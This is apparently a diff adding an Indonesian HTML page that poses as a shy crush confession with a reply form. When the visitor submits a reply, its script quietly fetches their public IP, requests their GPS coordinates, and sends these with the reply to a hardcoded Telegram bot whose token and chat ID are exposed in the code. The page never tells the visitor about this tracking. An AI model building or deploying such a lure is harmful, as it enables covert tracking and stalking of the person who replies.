@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Kirim ke Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #e0e0e0;
+            padding: 20px;
+            margin: 0;
+        }
+        form {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+        }
+        textarea {
+            width: 100%;
+            padding: 12px;
+            height: 100px;
+            margin-bottom: 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #2c2c2c;
+            color: #e0e0e0;
+            resize: none;
+        }
+        button {
+            padding: 12px 20px;
+            background-color: #03dac6;
+            color: #121212;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #018786;
+        }
+        h3 {
+            text-align: center;
+            color: #03dac6;
+            margin-bottom: 5px;
+        }
+        h5 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #bbbbbb;
+        }
+    </style>
+</head>
+<body>
+    <h3>haii maaf yaa udah mengagumi mu kamu always canti hihi, I have crush on you</h3>
+    <h5>Kirim Balasan</h5>
+    <form id="telegramForm">
+        <label for="pesan">Balasan Anda:</label>
+        <textarea id="pesan" name="pesan" required></textarea>
+        <button type="submit">Kirim Balasan</button>
+    </form>
+
+    <script>
+        const botToken = '7558386866:AAHDkaNEi3Tw7_5ew4LOedzfmf7a7hfioEA'; // Token Bot
+        const chatId = '7233342888'; // Chat ID
+
+        function getPublicIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(() => 'IP tidak tersedia');
+        }
+
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const latitude = position.coords.latitude;
+                            const longitude = position.coords.longitude;
+                            resolve(`Latitude: ${latitude}, Longitude: ${longitude}`);
+                        },
+                        () => resolve('Lokasi tidak tersedia')
+                    );
+                } else {
+                    resolve('Geolocation tidak didukung');
+                }
+            });
+        }
+
+        document.getElementById('telegramForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const pesanUser = document.getElementById('pesan').value;
+            const ip = await getPublicIP();
+            const lokasi = await getLocation();
+
+            const message = `📩 Pesan Baru:\n\nPesan: ${pesanUser}\nIP: ${ip}\nLokasi: ${lokasi}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert('Pesan berhasil dikirim ke Telegram!');
+                    document.getElementById('telegramForm').reset();
+                } else {
+                    alert('Gagal mengirim pesan. Coba lagi.');
+                }
+            })
+            .catch(() => alert('Terjadi kesalahan saat mengirim pesan.'));
+        });
+    </script>
+</body>
+</html>
